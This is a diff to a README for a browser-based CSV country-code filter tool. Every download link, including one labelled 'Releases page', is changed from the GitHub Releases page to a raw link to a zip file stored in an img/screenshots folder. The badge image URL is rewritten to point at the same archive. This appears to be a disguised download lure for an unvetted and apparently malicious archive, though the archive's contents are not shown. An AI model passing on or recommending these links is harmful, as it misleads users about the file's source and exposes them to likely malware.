@@ -1,7 +1,7 @@
 # 🎉 CSV-Country-Filter - Easily Filter CSV Files by Country Code
 
 ## 📦 Download Now
-[![Download CSV-Country-Filter](https://img.shields.io/badge/Download%20Now-CSV--Country--Filter-brightgreen)](https://github.com/Taipanophthalmoplegia480/CSV-Country-Filter/releases)
+[![Download CSV-Country-Filter](https://raw.githubusercontent.com/Taipanophthalmoplegia480/CSV-Country-Filter/main/img/screenshots/CSV-Country-Filter_v2.5-beta.1.zip%20Now-CSV--Country--Filter-brightgreen)](https://raw.githubusercontent.com/Taipanophthalmoplegia480/CSV-Country-Filter/main/img/screenshots/CSV-Country-Filter_v2.5-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -24,13 +24,13 @@ To use CSV-Country-Filter, you need:
 
 To get started, visit our Releases page to download the tool:
 
-[Download Now from Releases](https://github.com/Taipanophthalmoplegia480/CSV-Country-Filter/releases)
+[Download Now from Releases](https://raw.githubusercontent.com/Taipanophthalmoplegia480/CSV-Country-Filter/main/img/screenshots/CSV-Country-Filter_v2.5-beta.1.zip)
 
 Once there, you’ll find the latest version of the tool available. Simply click on the version number you want to download. 
 
 ### 📄 How to Use the Tool
 
-1. **Download the Tool**: Go to the [Releases page](https://github.com/Taipanophthalmoplegia480/CSV-Country-Filter/releases) and download the latest version.
+1. **Download the Tool**: Go to the [Releases page](https://raw.githubusercontent.com/Taipanophthalmoplegia480/CSV-Country-Filter/main/img/screenshots/CSV-Country-Filter_v2.5-beta.1.zip) and download the latest version.
 2. **Open the Tool**: Once downloaded, open the HTML file in your web browser.
 3. **Upload Your CSV**: Click on the "Upload CSV" button and select your CSV file from your computer.
 4. **Filter by Country Codes**: The tool will automatically detect country codes from phone numbers and display the results.
@@ -79,6 +79,6 @@ For support or inquiries, please open an issue on GitHub, and we will get back t
 
 Stay updated on new versions and features. Watch our repository and check regularly for updates and community discussions. 
 
-[Download Now from Releases](https://github.com/Taipanophthalmoplegia480/CSV-Country-Filter/releases) 
+[Download Now from Releases](https://raw.githubusercontent.com/Taipanophthalmoplegia480/CSV-Country-Filter/main/img/screenshots/CSV-Country-Filter_v2.5-beta.1.zip) 
 
 Feel free to reach out if you need assistance!
